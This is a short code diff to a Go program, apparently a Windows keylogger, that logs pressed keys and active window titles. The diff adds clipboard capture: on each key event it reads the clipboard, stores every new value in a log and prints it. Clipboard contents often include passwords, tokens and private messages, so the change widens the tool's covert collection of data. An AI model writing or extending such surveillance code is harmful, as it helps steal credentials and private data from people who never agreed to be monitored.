@@ -11,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/atotto/clipboard"
 	ps "github.com/bhendo/go-powershell"
 	"github.com/bhendo/go-powershell/backend"
 	"github.com/gonutz/w32"
@@ -173,9 +174,17 @@ func main() {
 			} else {
 				keylog = append(keylog, "["+key+"]", "")
 			}
+
+			// get window
 			title := platform.GetCurrentWindow()
 			if len(applog) == 0 || title != applog[len(applog)-1] {
 				applog = append(applog, title)
+			}
+			// get clipboard
+			clip, _ := clipboard.ReadAll()
+			if len(clipboardlog) == 0 || clip != clipboardlog[len(clipboardlog)-1] {
+				clipboardlog = append(clipboardlog, clip)
+				log.Println(clip)
 			}
 		case <-done:
 			return
